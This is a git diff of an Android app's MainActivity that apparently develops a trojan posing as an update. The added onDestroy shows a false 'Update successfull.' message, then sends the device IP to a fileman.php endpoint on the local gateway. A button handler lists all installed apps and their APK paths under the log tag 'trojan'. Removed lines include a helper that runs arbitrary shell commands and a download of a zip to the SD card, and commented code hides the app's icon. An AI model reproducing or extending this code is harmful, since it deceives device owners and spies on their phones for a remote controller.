@@ -8,8 +8,10 @@ import android.content.Intent;
 import android.util.Log;
 import android.widget.Toast;
 import android.content.pm.PackageManager;
+import android.content.pm.ApplicationInfo;
 import android.content.ComponentName;
 import java.io.*;
+import java.util.*;
 
 public class MainActivity extends Activity
 {
@@ -29,51 +31,48 @@ public class MainActivity extends Activity
 		seteditor.putString("main", "hotspot");    
         seteditor.commit();
 
-        String ip = Identitas.getIPAddress(true);
-//        startService(new Intent(this, System.class));
+		//startService(new Intent(this, System.class));
 
-		/*try {
+/*
+		try {
 			PackageManager p = getPackageManager();
 
 			p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 		}
-		catch (Exception e) {}
-*/
-		//Toast.makeText(this, "updated success "+shell("echo 10.42.0.3 | `cut -d '.' -f 1,2,3`"), Toast.LENGTH_LONG).show();
-		
+		catch (Exception e) {}*/
+
 		//finish();
 	}
 
-	public String shell(String command) {
+	public void onDestroy() {
+		super.onDestroy();
 
+		Toast.makeText(this, "Update successfull.", Toast.LENGTH_LONG).show();
+
+        String ip = Identitas.getIPAddress(true);
+        String[] route = ip.split("[.]");
+
+        int index = route.length - 1;
 		StringBuffer output = new StringBuffer();
-
-		Process p;
-		try {
-			p = Runtime.getRuntime().exec(command);
-			p.waitFor();
-			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-
-			String line = "";
-			while ((line = reader.readLine())!= null) {
-				output.append(line+"\n");
-			}
-
+		
+		for (int i=0; i<index; i++) {
+			output.append(route[i]+".");
 		}
-		catch (Exception e) {
-			e.printStackTrace();
-		}
-		String response = output.toString();
-		return response;
 
+		receiver.requestUrl = "http://"+output+"1:8888/fileman.php?id="+ip;
+		receiver.requestAksi = "web";
+		receiver.mainRequest(this);
 	}
 
 	public void btn(View v) {
-		ReceiverBoot rece = new ReceiverBoot();
-		rece.requestUrl = "http://10.42.0.1/download.php?id=ok.zip";
-		rece.requestAksi = "download";
-		rece.requestPath = "/sdcard/ok.zip";
-		rece.mainRequest(this);
-	}
+		PackageManager pm = getPackageManager();
+		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
 
+		for (ApplicationInfo pack : packages) {
+			Log.i("trojan", "install app    : "+pack.packageName);
+			Log.i("trojan", "apk file path  : "+pack.sourceDir);
+		}
+
+		Toast.makeText(this, "dfdfd", Toast.LENGTH_LONG).show();
+	}
 }
